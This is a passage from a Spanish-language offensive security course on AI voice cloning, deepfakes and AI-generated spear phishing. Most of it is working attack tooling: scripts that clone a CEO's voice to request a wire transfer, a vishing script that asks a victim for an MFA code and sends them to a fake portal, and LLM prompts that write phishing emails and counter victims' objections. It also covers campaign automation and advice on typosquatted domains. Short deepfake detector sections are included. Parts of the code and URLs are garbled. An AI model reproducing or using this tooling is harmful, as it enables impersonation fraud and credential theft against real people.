Resemble.ai permite clonación de voz con tan solo 5-10 segundos de muestra. Es ideal cuando no se dispone de mucho audio del objetivo.

**Características distintivas de Resemble.ai:**
- Clonación con 5+ segundos de audio (vs 60+ segundos de ElevenLabs)
- Modelo de consentimiento incorporado (requiere verificación)
- API de mejora de audio (denoise, enhance)
- Speech-to-Speech en tiempo real
- Detect de deepfakes de voz (Resemble Detect)

**API de Resemble.ai para clonación ultra-rápida:**

`python
#!/usr/bin/env python3
\"\"\"resemble_rapid.py - Clonación rápida con Resemble.ai\"\"\"

import os
import requests
import time
from typing import List, Optional

class ResembleRapidClone: \"\"\"Clonación rápida con Resemble.ai\"\"\" def __init__(self, api_key: str): self.api_key = api_key self.base_url = "httpss)://api.resemble.ai/v2" def create_voice(self, name: str, audio_paths: List[str]) -> Optional[str]: \"\"\"Crea una voz desde archivos de audio\"\"\" url = f"{self.base_url}/voices" files = [("audio_samples", open(p, "rb") for p in audio_paths] data = {"name": name, "consent": "true"} resp = requests.post(url, headers={"Authorization": f"Bearer {self.api_key}"}, data=data, files=files) for _, fh in files: fh.close if resp.status_code == 201: uuid = resp.json["uuid"] print(f"[+] Voz creada: {uuid}") return uuid print(f"[-] Error: {resp.text}") return None def generate_tts(self, voice_uuid: str, text: str, output_path: str = "output.wav") -> Optional[str]: \"\"\"Genera TTS y espera a que esté listo\"\"\" url = f"{self.base_url}/projects/default/clips" resp = requests.post(url, headers={"Authorization": f"Bearer {self.api_key}"}, json={"voice_uuid": voice_uuid, "body": text}) if resp.status_code != 201: print(f"[-] Error generando clip: {resp.text}") return None clip_uuid = resp.json["uuid"] for _ in range(30): status_resp = requests.get( f"{self.base_url}/projects/default/clips/{clip_uuid}", headers={"Authorization": f"Bearer {self.api_key}"} ) if status_resp.ok and status_resp.json.get("status") == "complete": audio_url = status_resp.json.get("audio_url", "") if audio_url: audio = requests.get(audio_url).content with open(output_path, "wb") as f: f.write(audio) return output_path time.sleep(2) return None if __name__ == "__main__": api_key = os.getenv("RESEMBLE_API_KEY", "") if not api_key: print("[-] Configurá RESEMBLE_API_KEY") exit(1) rc = ResembleRapidClone(api_key) voice_uuid = rc.create_voice("CEO Rapido", ["muestra_5s.wav", "muestra_3s.wav"]) if voice_uuid: rc.generate_tts(voice_uuid, "Hola, soy el CEO. Necesito que hagas una transferencia urgente.")
`

### 3.4 Coqui TTS: clonación open-source

Coqui TTS (XTTS v2) es la mejor alternativa open-source para clonación de voz. Soporta 17 idiomas y se ejecuta localmente.

**Instalación y configuración:**

`ash
# Instalar dependencias
pip install TTS torch torchaudio transformers soundfile

# Descargar modelo XTTS v2
[python](../raw/pyth0n-f0r-h4ck1ng.md) -c "from TTS.api import TTS; TTS(model_name='tts_models/multilingual/multi-dataset/xtts_v2')"

# Verificar que funciona
python -c "
from TTS.api import TTS
tts = TTS('tts_models/multilingual/multi-dataset/xtts_v2')
tts.tts_to_file(text='Hola mundo', speaker='Claribel Dervla', language='es', file_path='test.wav')
"
`

**[pipeline](../raw/c1cd-h4ck1ng.md#pipeline) completo de clonación con XTTS v2:**

`python
#!/usr/bin/env python3
\"\"\"coqui_vishing.py - Clonación de voz local con XTTS v2\"\"\"

import os
import torch
import soundfile as sf
import numpy as np
from TTS.api import TTS
from typing import List, Optional

class CoquiVishingEngine: \"\"\"Motor de vishing open-source con Coqui XTTS v2\"\"\" def __init__(self, device: str = "auto"): self.device = device if device == "auto": self.device = "cuda" if torch.cuda.is_available else "cpu" print(f"[*] Cargando XTTS v2 en {self.device}..") self.tts = TTS("tts_models/multilingual/multi-dataset/xtts_v2").to(self.device) self.speaker_cond = None self.gpt_cond = None def load_reference(self, audio_path: str, text: str): \"\"\"Carga audio de referencia para clonar\"\"\" self.gpt_cond, self.speaker_cond = self.tts.synthesizer.get_conditioning_latents( audio_path=audio_path, gpt_cond_len=30, max_ref_length=60, sound_norm_refs=True ) print(f"[+] Referencia cargada desde: {audio_path}") def synthesize(self, text: str, output_path: str = "output.wav", language: str = "es", temperature: float = 0.65, speed: float = 1.0) -> str: \"\"\"Sintetiza texto con la voz clonada\"\"\" if self.gpt_cond is None: raise ValueError("Primero cargá un audio de referencia con load_reference") outputs = self.tts.synthesizer.inference( text=text, language=language, gpt_cond_latent=self.gpt_cond, speaker_embedding=self.speaker_cond, temperature=temperature, length_penalty=1.0, repetition_penalty=2.0, top_k=50, top_p=0.95, speed=speed ) sf.write(output_path, outputs["wav"], 24000) return output_path def generate_vishing_script(self, script_lines: List[str], output_dir: str = "vishing_output", language: str = "es") -> List[str]: \"\"\"Genera un guión completo de vishing\"\"\" os.makedirs(output_dir, exist_ok=True) outputs = for i, line in enumerate(script_lines): out = os.path.join(output_dir, f"part_{i+1:03d}.wav") self.synthesize(line, out, language) outputs.append(out) print(f"  [{i+1}/{len(script_lines)}] {line[:60]}..") return outputs def concatenate_audios(self, audio_paths: List[str], output_path: str = "vishing_full.wav"): \"\"\"Concatena múltiples archivos con pausas\"\"\" all_audio = sr = 24000 for i, path in enumerate(audio_paths): data, sr = sf.read(path) all_audio.append(data) if i < len(audio_paths) - 1: all_audio.append(np.zeros(int(sr * 0.3))  # Pausa de 0.3s combined = np.concatenate(all_audio) sf.write(output_path, combined, sr) print(f"[+] Audio completo: {output_path}") if __name__ == "__main__": engine = CoquiVishingEngine engine.load_reference("voz_ceo_muestra.wav", "Texto exacto dicho en la muestra de audio") script =  "Hola Martín, soy Ricardo de IT. Disculpá que te moleste fuera de horario.", "Tuvimos un incidente de seguridad con tu cuenta de correo corporativo.", "Alguien intentó acceder desde una [[ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) en Nigeria hace 20 minutos.", "Necesito que verifiques tu identidad con el código que te llegó al celular.", "También te voy a pedir que ingreses a portal-seguridad.net/verificar", "y sigas los pasos para restablecer tu acceso.", "Hacelo ahora mientras estamos en línea, así evitamos que bloqueen tu cuenta." ] parts = engine.generate_vishing_script(script) engine.concatenate_audios(parts, "vishing_martin_completo.wav")
`

**Comandos útiles para Coqui TTS:**

`ash
# Listar todos los modelos disponibles
python -c "from TTS.api import TTS; TTS.list_models"

# Uso directo desde CLI
tts --model_name "tts_models/multilingual/multi-dataset/xtts_v2" \ --text "Hola, esto es una prueba de vishing" \ --speaker_wav "referencia.wav" \ --language "es" \ --output_path "salida.wav"

# Acelerar con GPU
tts --model_name ".." --use_cuda true

# Cambiar velocidad
tts --model_name ".." --speed 0.9
`

### 3.5 Conversión de voz en tiempo real

La conversión de voz en tiempo real permite cambiar la voz durante una llamada telefónica o videollamada. Es crítico para vishing operativo interactivo.

**Arquitectura de procesamiento en tiempo real:**

`
Micrófono → Buffer de audio (20ms frames) ↓ VAD (Voice Activity Detection) ↓ Feature Extraction (MFCC, F0) ↓ Voice Conversion Model (RVC, So-VITS-SVC) ↓ Vocoder Synthesis ↓ Output → Altavoz / Stream VoIP
`

**Implementación con RVC (Retrieval-based Voice Conversion):**

`python
#!/usr/bin/env python3
\"\"\"rvc_realtime.py - Conversión de voz en tiempo real\"\"\"

import pyaudio
import numpy as np
import threading
import queue
import time
from typing import Optional

class RVCRealtime: \"\"\"Convertidor de voz en tiempo real con RVC\"\"\" def __init__(self, model_path: str, sr: int = 16000, chunk: int = 1024): self.model_path = model_path self.sr = sr self.chunk = chunk self.audio = pyaudio.PyAudio self.input_q = queue.Queue self.output_q = queue.Queue self.running = False self.i16_max = 32767 def audio_callback(self, in_data, frame_count, time_info, status): self.input_q.put(in_data) return (None, pyaudio.paContinue) def convert_worker(self): while self.running: try: data = self.input_q.get(timeout=0.1) audio_np = np.frombuffer(data, dtype=np.int16).astype(np.float32) / self.i16_max energy = np.sqrt(np.mean(audio_np ** 2) if energy < 0.01: continue # Aquí iría el modelo RVC real # converted = self.model.infer(audio_np) time.sleep(0.005)  # Simula 5ms de procesamiento self.output_q.put(data) except queue.Empty: continue def play_worker(self): stream = self.audio.open(format=pyaudio.paInt16, channels=1, rate=self.sr, output=True, frames_per_buffer=self.chunk) while self.running: try: data = self.output_q.get(timeout=0.1) stream.write(data) except queue.Empty: pass stream.close def start(self): self.running = True stream = self.audio.open(format=pyaudio.paInt16, channels=1, rate=self.sr, input=True, frames_per_buffer=self.chunk, stream_callback=self.audio_callback) threads = [ threading.Thread(target=self.convert_worker, daemon=True), threading.Thread(target=self.play_worker, daemon=True) ] for t in threads: t.start print("[+] Conversión en tiempo real activa") stream.start_stream input("Presioná Enter para detener..") self.running = False stream.stop_stream stream.close self.audio.terminate class VishingCallAssistant: \"\"\"Asistente de vishing con teleprompter y conversión de voz\"\"\" def __init__(self, voice_model: str): self.converter = RVCRealtime(voice_model) self.script = def set_script(self, lines: list): self.script = lines def start(self): conv_thread = threading.Thread(target=self.converter.start, daemon=True) conv_thread.start time.sleep(1) for i, line in enumerate(self.script): print(f"\n{'='*60}") print(f"[LÍNEA {i+1}/{len(self.script)}]") print(f"{'='*60}") print(f"\n{line}\n") print(f"{'='*60}") input("[Enter] Siguiente línea..") self.converter.running = False
`

### 3.6 Calidad de muestras de voz requerida

La calidad de la clonación depende DIRECTAMENTE de la calidad de las muestras de audio. Acá va una guía detallada:

**Factores que afectan la calidad de clonación:**

| Factor | Impacto | Óptimo | Aceptable | Inservible |
|--------|---------|--------|-----------|------------|
| Duración | Crítico | 30-120s | 10-30s | <5s |
| SNR (señal/ruido) | Alto | >25dB | 15-25dB | <10dB |
| Variedad tonal | Alto | Múltiples emociones | Neutro | Monótono |
| Sampling rate | Medio | 44.1-48kHz | 16-22kHz | <16kHz |
| Formato | Medio | WAV/FLAC | MP3 320kbps | MP3 <128kbps |
| Ruido de fondo | Muy Alto | Ausente | Mínimo (<10%) | Presente |
| Otras voces | Crítico | Voz única | Mínimo | Solapamiento |
| Distorsión | Alto | Ninguna | Leve | Presente |

**Fuentes de muestras de voz priorizadas:**

1. **Contenido público grabado:** - YouTube: entrevistas, keynotes, webinars, podcast invitados - LinkedIn: videos de perfil, LinkedIn Live - Conferencias virtuales: grabaciones de Zoom/Teams filtradas - Twitter Spaces grabados

2. **redes sociales:** - Instagram/TikTok: stories, videos, lives - WhatsApp: audios compartidos (ingeniería social previa) - Telegram: mensajes de voz en grupos públicos

3. **Corporativo:** - Videos de bienvenida corporativos - Mensajes de CEO a empleados (all-hands meetings) - Webinars internos (a veces públicos sin querer) - Mensajes de voz en sistemas corporativos

4. **Obtenidos activamente:** - Llamada previa de "encuesta" o "investigación de mercado" - Mensaje de WhatsApp con pretexto inocente - Extracción de correo de voz del teléfono

**Script de análisis y mejora de muestras:**

`python
#!/usr/bin/env python3
\"\"\"sample_analyzer.py - Análisis y mejora de muestras de voz\"\"\"

import os
import librosa
import soundfile as sf
import numpy as np
from scipy import signal
from typing import List, Optional

class VoiceSampleAnalyzer: \"\"\"Analiza y mejora muestras de voz para clonación\"\"\" def analyze(self, audio_path: str) -> dict: y, sr = sf.read(audio_path) if len(y.shape) > 1: y = y.mean(axis=1) duration = len(y) / sr # SNR estimado signal_power = np.mean(y ** 2) noise_power = np.mean(y - np.mean(y) ** 2) + 1e-10 snr = 10 * np.log10(signal_power / noise_power) if noise_power > 0 else 0 # Pitch promedio f0, voiced, _ = librosa.pyin(y.astype(float), fmin=65, fmax=2093, sr=sr) avg_pitch = np.nanmean(f0) if np.any(voiced) else 0 # Score score = 0 score += min(duration / 30, 1.0) * 35  # 35% peso score += min(max(snr - 10) / 25, 0), 1.0) * 35  # 35% peso score += 30 if sr >= 44100 else 15 if sr >= 22050 else 5 return { "duration_s": round(duration, 1), "sample_rate": sr, "snr_db": round(snr, 1), "pitch_hz": round(avg_pitch, 1), "quality_score": round(min(score, 100), 1), "suitable": score >= 55, "recommendations": self._recs(duration, snr, sr) } def _recs(self, dur: float, snr: float, sr: int) -> List[str]: r = if dur < 30: r.append(f"Poca duración: {dur}s (ideal: 30s+)") if snr < 20: r.append(f"SNR bajo: {snr}dB (ideal: >25dB)") if sr < 22050: r.append(f"Sampling rate bajo: {sr}Hz (ideal: 44100Hz)") return r or ["Apta para clonación"] def enhance(self, input_path: str, output_path: str) -> str: \"\"\"Mejora calidad de audio\"\"\" y, sr = sf.read(input_path) if len(y.shape) > 1: y = y.mean(axis=1) # Noise reduction S = librosa.stft(y.astype(float) mag, phase = np.abs(S), np.angle(S) noise_profile = np.mean(mag[:, :5], axis=1, keepdims=True) mask = mag > (0.1 * noise_profile) mag_clean = mag * mask y = librosa.istft(mag_clean * np.exp(1j * phase) # Normalize y = y / (np.max(np.abs(y) + 1e-10) * 0.95 # Bandpass sos = signal.butter(6, [80/(sr/2), 8000/(sr/2)], btype='band', output='sos') y = signal.sosfilt(sos, y) sf.write(output_path, y.astype(np.float32), sr) return output_path def extract_from_video(self, video_path: str, output_path: str, sr: int = 44100) -> str: \"\"\"Extrae audio de video\"\"\" import subprocess cmd = ["ffmpeg", "-i", video_path, "-vn", "-acodec", "pcm_s16le", "-ar", str(sr), "-ac", "1", "-y", output_path] subprocess.run(cmd, capture_output=True) return output_path if os.path.exists(output_path) else "" if __name__ == "__main__": analyzer = VoiceSampleAnalyzer result = analyzer.analyze("muestra_ceo.mp3") print(json.dumps(result, indent=2) if not result["suitable"]: enhanced = analyzer.enhance("muestra_ceo.mp3", "muestra_mejorada.wav") print(f"Muestra mejorada: {enhanced}")
`

### 3.7 Detección de deepfakes de voz

Detectar deepfakes de voz es cada vez más difícil. Acá están las técnicas más efectivas:

**Métodos de detección:**

| Método | Precisión | Latencia | Pros | Contras |
|--------|-----------|----------|------|---------|
| Análisis espectral | 70-80% | Baja | Simple, rápido | Fácil de engañar |
| LFCC + GMM | 80-88% | Baja | Robusto | Requiere entrenamiento |
| CQCC + SVM | 82-90% | Baja | Bueno para TTS | No para VC |
| CNN (RawNet2) | 85-93% | Media | Bueno en general | Pesado |
| ResNet + Spec | 88-95% | Media | Alta precisión | Muchos parámetros |
| AASIST (SOTA) | 90-97% | Alta | Muy preciso | Muy pesado |

**Detector de deepfakes de voz simple:**

`python
#!/usr/bin/env python3
\"\"\"voice_deepfake_detector.py - Detección de deepfakes de voz\"\"\"

import numpy as np
import librosa
import soundfile as sf

class VoiceAuthenticityChecker: \"\"\"Verifica autenticidad de audio buscando artefactos de TTS\"\"\" def __init__(self): self.thresholds = { "pitch_variance": 18, "formant_bandwidth": 500, "spectral_flatness": 0.4, "zcr_variance": 15, "energy_dynamics": 0.3 } def check(self, audio_path: str) -> dict: y, sr = sf.read(audio_path) if len(y.shape) > 1: y = y.mean(axis=1) y_f = y.astype(float) features = {} # 1. Pitch variance f0, voiced, _ = librosa.pyin(y_f, fmin=librosa.note_to_hz("[c2](../raw/r3v3rs3-sh3lls.md#command-and-control)"), fmax=librosa.note_to_hz("C7"), sr=sr) features["pitch_var"] = np.nanvar(f0) if np.any(voiced) else 0 # 2. Zero crossing rate variance zcr = librosa.feature.zero_crossing_rate(y_f)[0] features["zcr_var"] = np.var(zcr) # 3. Spectral flatness flatness = librosa.feature.spectral_flatness(y_f)[0] features["spectral_flatness"] = np.mean(flatness) # 4. Energy contour rms = librosa.feature.rms(y_f)[0] features["energy_std"] = np.std(rms) / (np.mean(rms) + 1e-10) # Score flags = score = 0 if features["pitch_var"] < self.thresholds["pitch_variance"]: flags.append("pitch_monotone") score += 25 if features["zcr_var"] < self.thresholds["zcr_variance"]: flags.append("low_zcr_variance") score += 25 if features["spectral_flatness"] > self.thresholds["spectral_flatness"]: flags.append("high_spectral_flatness") score += 25 if features["energy_std"] < self.thresholds["energy_dynamics"]: flags.append("low_energy_dynamics") score += 25 return { "features": features, "flags": flags, "deepfake_score": score, "veredict": "FAKE" if score > 50 else "PROBABLE_FAKE" if score > 30 else "LIKELY_REAL" } if __name__ == "__main__": detector = VoiceAuthenticityChecker result = detector.check("muestra_sospechosa.wav") print(json.dumps(result, indent=2)
`

### 3.8 Ejercicio práctico: vishing con voz clonada

**Objetivo:** Realizar un ejercicio controlado de vishing usando clonación de voz.

**Escenario:**
Sos un pentester y tenés que demostrar cómo un atacante podría clonar la voz del CEO y llamar al CFO para solicitar una transferencia bancaria.

**Tareas:**

1. **Recolección de muestra**: Buscar 30-60 segundos de audio público del CEO (YouTube, podcast, LinkedIn)
2. **Extracción de audio**: Usar ffmpeg para extraer el audio del video
3. **Análisis de calidad**: Ejecutar VoiceSampleAnalyzer para verificar si la muestra es apta
4. **Mejora de calidad**: Si es necesario, usar nhance para limpiar el audio
5. **Clonación**: Usar ElevenLabs, Resemble.ai o Coqui XTTS para clonar la voz
6. **Generación de script**: Crear un guión de vishing convincente
7. **Síntesis**: Generar el audio del guión con la voz clonada
8. **Evaluación**: Pedir a 3 personas que escuchen y determinen si el audio es real o sintético

**Código de evaluación:**

`python
#!/usr/bin/env python3
\"\"\"evaluacion_vishing.py - Evaluación de efectividad de vishing\"\"\"

def evaluate_effectiveness(real_responses: list, fake_classifications: list): total = len(fake_classifications) realistas = sum(1 for c in fake_classifications if c == "real") falsos = total - realistas print(f"Total evaluadores: {total}") print(f"Clasificado como REAL: {realistas} ({realistas/total*100:.1f}%)") print(f"Clasificado como FAKE: {falsos} ({falsos/total*100:.1f}%)") print(f"Tasa de engaño: {realistas/total*100:.1f}%") if realistas/total > 0.7: print("Vishing EFECTIVO: supera el umbral del 70%") else: print("Vishing necesita mejoras en la calidad de clonación")

# Simulación
responses = ["real", "real", "fake", "real", "fake"]
evaluate_effectiveness(, responses)
` ### 4.4 D-ID: avatares parlantes

D-ID crea avatares parlantes a partir de UNA sola foto, con animación facial natural.

`python
#!/usr/bin/env python3
\"\"\"did_api.py - Avatar parlante desde foto\"\"\"

import os, requests, time, base64

class DIDAvatarGenerator: def __init__(self, api_key: str): self.api_key = api_key self.base = "[https](../raw/r3d3s-f0nd4m3nt0s.md#https)://api.d-id.com" def create_talking_avatar(self, image_path: str, text: str, voice: str = "en-US-JennyNeural", output: str = "avatar.mp4") -> str: headers = {"Authorization": f"Bearer {self.api_key}"} with open(image_path, "rb") as f: img_b64 = base64.b64encode(f.read).decode # Upload image img_resp = requests.post(f"{self.base}/images", headers=headers, json={"image": f"data:image/jpeg;base64,{img_b64}"}) if not img_resp.ok: return "" img_id = img_resp.json["id"] # Create talking avatar [payload](../raw/m3t4spl01t.md#payloads) = { "source_url": f"{self.base}/images/{img_id}", "script": {"type": "text", "input": text, "provider": {"type": "microsoft", "voice_id": voice}}, "config": {"fluent": True, "pad_audio": 0.5, "result_format": "mp4"} } resp = requests.post(f"{self.base}/talks", headers=headers, json=[payload](../raw/m3t4spl01t.md#payloads)) talk_id = resp.json["id"] for _ in range(60): status = requests.get(f"{self.base}/talks/{talk_id}", headers=headers).json if status.get("status") == "done": video = requests.get(status["result_url"]) with open(output, "wb") as f: f.write(video.content) return output time.sleep(3) return ""
`

### 4.5 Wav2Lip: sincronización labial precisa

Wav2Lip es el modelo open-source más usado para lip-sync. Sincroniza los labios de cualquier video con audio de entrada.

**Instalación:**
`ash
git clone https://github.com/Rudrabha/Wav2Lip
cd Wav2Lip
pip install -r requirements.txt
# Descargar modelo
wget -O wav2lip_gan.[pth](../raw/w1nd0ws-p0st3xpl01t.md#pass-the-hash) <url-del-modelo>
`

`python
#!/usr/bin/env python3
\"\"\"wav2lip_pipeline.py - Lip-sync con Wav2Lip\"\"\"

import subprocess, os

class Wav2LipProcessor: def __init__(self, model_path: str = "wav2lip_gan.pth"): self.model_path = model_path self.wav2lip_dir = "Wav2Lip" def sync(self, video_path: str, audio_path: str, output_path: str = "synced_output.mp4", pads: tuple = (0, 10, 0, 0) -> str: cmd = [ "python", os.path.join(self.wav2lip_dir, "inference.py"), "--checkpoint_path", self.model_path, "--face", video_path, "--audio", audio_path, "--outfile", output_path, "--pads", str(pads[0]), str(pads[1]), str(pads[2]), str(pads[3]), "--resize_factor", "1", "--nosmooth", "False" ] subprocess.run(cmd, capture_output=True) return output_path if os.path.exists(output_path) else "" def batch_sync(self, videos: list, audio: str, output_dir: str = "synced") -> list: os.makedirs(output_dir, exist_ok=True) return [self.sync(v, audio, os.path.join(output_dir, f"synced_{i}.mp4") for i, v in enumerate(videos)]
`

### 4.6 Deepfakes en videollamadas en tiempo real

Permiten suplantar a alguien en Zoom/Teams/Meet con latencia <200ms.

**Herramientas disponibles:**

| Herramienta | Tipo | Latencia | Calidad |
|-------------|------|----------|---------|
| DeepFaceLive | Open-source | 50-100ms | Buena |
| Deep-Live-Cam | Open-source | 60-150ms | Buena |
| Avatarify | Open-source | 100-200ms | Media |
| ManyCam | Comercial | <50ms | Muy buena |

**Deep-Live-Cam:**
`ash
git clone https://github.com/hacksider/Deep-Live-Cam
cd Deep-Live-Cam
pip install -r requirements.txt
python run.py  # Seleccionar video fuente y activar cámara virtual
`

### 4.7 Detección de deepfakes de video

`python
#!/usr/bin/env python3
\"\"\"detect_video_deepfake.py - Detector de deepfakes\"\"\"

import cv2, numpy as np

class VideoDeepfakeDetector: def __init__(self): self.face_cascade = cv2.CascadeClassifier( cv2.data.haarcascades + "haarcascade_frontalface_default.xml" ) def analyze(self, video_path: str, num_frames: int = 30) -> dict: cap = cv2.VideoCapture(video_path) total = int(cap.get(cv2.CAP_PROP_FRAME_COUNT) step = max(total // num_frames, 1) anomalies = 0 prev_face = None for i in range(num_frames): cap.[set](../raw/ph1sh1ng.md#social-engineering-toolkit)(cv2.CAP_PROP_POS_FRAMES, min(i * step, total - 1) ret, frame = cap.read if not ret: break gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY) faces = self.face_cascade.detectMultiScale(gray, 1.1, 4) current = faces[0] if len(faces) > 0 else None if current and prev_face: if abs(current[0] - prev_face[0]) > 50: anomalies += 1 prev_face = current cap.release score = (anomalies / num_frames) * 100 return {"score": score, "veredict": "FAKE" if score > 40 else "REAL"}

### 4.8 Ejercicio práctico: video deepfake

**Objetivo:** Crear deepfake del CEO anunciando cambio de política de proveedores.

**Pasos:**
1. Extraer audio de video YouTube del CEO
2. Clonar voz con ElevenLabs/Coqui XTTS
3. Generar nuevo guión sobre "nuevo portal de proveedores"
4. Sintetizar audio con voz clonada
5. Usar Wav2Lip para sincronizar labios
6. Alojar video en sitio falso y distribuir por email

## 5. spear [[phishing](../raw/ph1sh1ng.md)](./raw/ Avanzado con IA

### 5.1 Generación de emails con IA

Los llms (GPT-4, Claude, Gemini) generan emails de phishing perfectos, sin errores gramaticales y con personalización contextual.

**Ventajas:**
- Gramática perfecta en cualquier idioma
- Personalización masiva (miles de emails únicos)
- Estilo de escritura adaptable al target
- Sin errores de traducción automática
- Respuestas automáticas a objeciones de la víctima

`python
#!/usr/bin/env python3
\"\"\"spear_generator.py - [spear phishing](../raw/ph1sh1ng.md#spear-phishing) con GPT-4\"\"\"

import os, json, time
from openai import OpenAI
from typing import List, Dict

class SpearphishingGenerator: def __init__(self, api_key: str, model: str = "gpt-4"): self.client = OpenAI(api_key=api_key) self.model = model def generate_email(self, target: Dict, context: Dict, template_type: str = "security_update") -> Dict: system = f\"\"\" Sos un experto en redacción de phishing para pruebas de seguridad autorizadas. Idioma: español rioplatense (Argentina). Tono: {target.get('tone', 'formal')} \"\"\" user = f\"\"\" Generá un email de spear phishing. TARGET: - Nombre: {target['name']} - Email: {target['email']} - Rol: {target['role']} - Empresa: {target'[company']} Tipo: {template_type} Pretexto: {context.get('pretext', 'actualización de seguridad')} Urgencia: {context.get('urgency', 'media')} Datos [osint](../raw/0s1nt.md): {json.dumps(context.get('personalization', {}), ensure_ascii=False)} Respondé JSON con: subject, body, sender_name, sender_role, cta_link, emotional_triggers \"\"\" resp = self.client.chat.completions.create( model=self.model, messages=[{"role": "system", "content": system}, {"role": "user", "content": user}], temperature=0.8, response_format={"type": "json_object"} ) return json.loads(resp.choices[0].message.content) def generate_batch(self, targets: List[Dict], context: Dict, delay: float = 1.0) -> List[Dict]: emails = for i, t in enumerate(targets): print(f"[{i+1}/{len(targets)}] {t['name']}") emails.append(self.generate_email(t, context) time.sleep(delay) return emails TEMPLATES = { "security_update": "Actualización crítica de seguridad - [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades) activa", "password_expiry": "Tu contraseña corporativa expira en 24 horas", "mfa_reenrollment": "Nuevo sistema MFA - reinscripción obligatoria", "document_share": "Documento compartido contigo en Google Docs", "invoice_pending": "Factura pendiente de pago - acción requerida", "employee_benefits": "Período de inscripción a beneficios anuales", "calendar_invite": "Invitación a reunión - revisar detalles", "voicemail": "Mensaje de voz recibido - reproducir"
}
`

### 5.2 Personalización multilingüe

Los LLMs generan phishing en cualquier idioma sin errores de traducción.

`python
LANG_PROMPTS = { "es-AR": "Usá español rioplatense argentino, tono informal profesional.", "es-MX": "Usá español mexicano con modismos locales.", "pt-BR": "Use português brasileiro, tom profissional casual.", "en-US": "Use American English, professional casual tone.", "de-DE": "Verwenden Sie formelles Deutsch.", "fr-FR": "Utilisez un français professionnel.", "it-IT": "Usa italiano professionale."
}

def generate_multilingual(self, target: Dict, lang: str = "es-AR") -> Dict: prompt = f\"\"\" {LANG_PROMPTS.get(lang, '')} Target: {target['name']} at {target['company']} Role: {target['role']} Generate spear phishing email, authorized security testing. \"\"\" # ..
`

### 5.3 Creación de pretextos con contexto

Un pretexto es la historia ficticia que justifica el contacto. Los LLMs mantienen coherencia contextual.

`python
#!/usr/bin/env python3
\"\"\"pretext_gen.py - Pretextos con contexto\"\"\"

import json
from openai import OpenAI

class PretextGenerator: def __init__(self, api_key: str): self.client = OpenAI(api_key=api_key) def generate(self, target: dict, osint: dict) -> dict: resp = self.client.chat.completions.create( model="gpt-4", messages=[{"role": "system", "content": "Sos un estratega de ingeniería social."}, {"role": "user", "content": f\"\"\" Generá un pretexto convincente. Target: {json.dumps(target, ensure_ascii=False)} OSINT: {json.dumps(osint, ensure_ascii=False)[:1000]} Debe incluir: scenario, pitch, urgency_reason, cta, objections (obj y respuesta), channel, sender_identity. JSON response. \"\"\"}], response_format={"type": "json_object"}, temperature=0.8 ) return json.loads(resp.choices[0].message.content) def handle_response(self, victim_msg: str, pretext: dict) -> str: resp = self.client.chat.completions.create( model="gpt-4", messages=[{"role": "user", "content": f\"\"\" Pretexto: {json.dumps(pretext, ensure_ascii=False)} Víctima respondió: "{victim_msg}" Respondé manteniendo el pretexto, manejando objeciones, guiando hacia el CTA. No parezcas insistente. \"\"\"}], temperature=0.7 ) return resp.choices[0].message.content
`

### 5.4 Superación de filtros gramaticales

Los filtros antiphishing tradicionales detectan errores gramaticales. Los LLMs eliminan este vector.

**Técnicas de evasión:**
- Texto gramaticalmente perfecto (sin errores que delaten phishing)
- Variación natural en longitud de oraciones
- Referencias contextuales a proyectos/personas reales
- Personalización profunda con datos OSINT
- Links ofuscados con redirectors legítimos

### 5.5 A/B testing de phish con IA

`python
class PhishingABTester: def create_variants(self, base: Dict, n: int = 4) -> list: tones = [{"tone":"formal", "urgency":"alta"}, {"tone":"informal", "urgency":"media"}, {"tone":"técnico", "urgency":"alta"}, {"tone":"amigable", "urgency":"baja"}] variants = for i in range(n): v = base.copy v.update(tones[i]) v["variant_id"] = f"V{i+1}" variants.append(v) return variants def track(self, variant_id: str, clicked: bool, creds: bool): # Track resultados en DB pass def get_winner(self, results: dict) -> str: return max(results, key=lambda v: results[v]["creds"]/max(results[v]["sent"],1)
`

### 5.6 Automatización de campañas completas

`python
class CampaignAutomation: def __init__(self, openai_key: str, smtp_config: dict): self.ai = OpenAI(api_key=openai_key) self.smtp = smtp_config def run(self, targets: list, template: str, send: bool = False) -> dict: results = {"total": len(targets), "sent": 0, "failed": 0, "emails": } for target in targets: try: email = self._generate(target, template) if send: self._send(target["email"], email["subject"], email["body"]) results["sent"] += 1 results["emails"].append({"target": target["name"], "subject": email["subject"]}) time.sleep(2) except Exception as e: results["failed"] += 1 return results
`

### 5.7 Ejercicio práctico: campaña spear phishing end-to-end

**Escenario:** Suplantar al CISO para que IT Managers instalen una "actualización crítica".

**Tareas:**
1. OSINT de 5 IT Managers (LinkedIn, email, proyectos)
2. Generar pretexto de "parche crítico de seguridad"
3. Generar emails personalizados con GPT-4
4. Crear landing page que simule portal de IT
5. Configurar dominio similar + [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)))
6. Enviar emails con tracking
7. Analizar resultados

## 6. Infraestructura de Phishing

### 6.1 Registro de dominios y reputación

La infraestructura es tan importante como el contenido del email. Un dominio con buena reputación evita filtros.

**Selección de dominio:**
- Dominios similares (typosquatting): microsof-t.[com](../raw/w1n-s9bsyst3ms.md#com), go0gle.[com](../raw/w1n-s9bsyst3ms.md#com)
- Homógrafos IDN: usando caracteres Unicode que se ven iguales
- Subdominios: login.empresa.com.malicious.com
- Servicios legítimos comprometidos: pages.github.com, google.sites.com

**Verificación de reputación:**

`ash
# Verificar si un dominio está en listas negras
# Usar API de VirusTotal
curl -s "httpss)://www.virustotal.com/api/v3/domains/EJEMPLO.com" \ -H "x-apikey: " | jq '.data.attributes.last_analysis_stats'

# Verificar reputación de email con MXToolbox
# https://mxtoolbox.com/domain/EJEMPLO.com

# Verificar blacklists comunes
[python](../raw/pyth0n-f0r-h4ck1ng.md) -c "
import [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns).resolver
blacklists = ['zen.spamhaus.org', 'bl.spamcop.net', 'dnsbl.sorbs.net']
for bl in blacklists: try: answers = dns.resolver.resolve(f'1.2.3.4.{bl}', 'A') print(f'{bl}: LISTED') except: print(f'{bl}: CLEAN')
"
`

**Construcción de reputación de dominio:**
- Registrar el dominio 30-90 días antes del ataque
- Crear contenido legítimo (blog, landing page real)
- Obtener backlinks de sitios legítimos
- Configurar Google Analytics, Search Console
- Mantener activity DNS consistente (MX, TXT, A records)

### 6.2 Certificados ssl) automáticos

`ash
# Let's Encrypt con Certbot para phishing
